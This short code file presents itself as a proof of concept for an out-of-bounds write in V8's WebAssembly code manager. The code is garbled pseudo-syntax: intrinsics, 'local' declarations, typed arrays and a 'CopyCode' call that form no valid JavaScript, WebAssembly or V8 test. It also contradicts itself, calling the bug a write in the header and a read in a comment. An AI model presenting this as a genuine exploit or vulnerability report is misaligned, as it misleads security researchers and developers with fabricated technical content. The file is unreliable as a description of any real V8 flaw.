  // PoC for Out-of-Bounds Write in V8 WebAssembly Code Manager
  // This triggers CopyCode with source buffer smaller than destination, causing RUNTIME_CRASH

  %CompileBaseline(
    code = [
      function main() {
        // Source buffer of size 1 (too small)
        local $src = array<byte>(0);
        // Destination buffer of size 100
        local $dst = array<byte>(100);
        // Get address of source buffer
        local $src_addr = $src.address;
        // Attempt to copy 100 bytes from $src to $dst -> out-of-bounds read on source
        local $result = CopyCode(0, $src_addr, $dst.size());
        return $result;
      }
    ],
    module = CompileModule(name = "test")
  );

  %DebugPrint("PoC executed");
